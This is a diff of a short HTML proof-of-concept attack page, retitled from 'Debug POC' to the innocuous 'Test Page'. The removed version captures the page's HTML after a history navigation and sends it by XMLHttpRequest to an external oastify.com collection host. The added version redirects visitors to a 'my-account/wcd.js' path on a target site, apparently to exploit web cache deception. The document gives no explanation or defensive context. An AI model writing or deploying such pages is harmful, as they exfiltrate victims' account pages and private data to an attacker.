@@ -1,27 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Debug POC</title>
+    <title>Test Page</title>
 </head>
 <body>
-    <h1>Debugging POC</h1>
+    <h1>JavaScript Test</h1>
     <script>
-        try {
-            console.log("Navigating back in history...");
-            history.go(-1);
-
-            setTimeout(() => {
-                console.log("Captured Content: ", document.body.innerHTML);
-
-                // Log the result to an external server (optional)
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", "https://znqwcid8196twl0hpmcmi0algcm3auei3.oastify.com", true);
-                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("data=" + encodeURIComponent(document.body.innerHTML));
-            }, 2000);
-        } catch (e) {
-            console.error("An error occurred:", e);
-        }
+        document.location = "https://targeted website/my-account/wcd.js";
     </script>
 </body>
 </html>
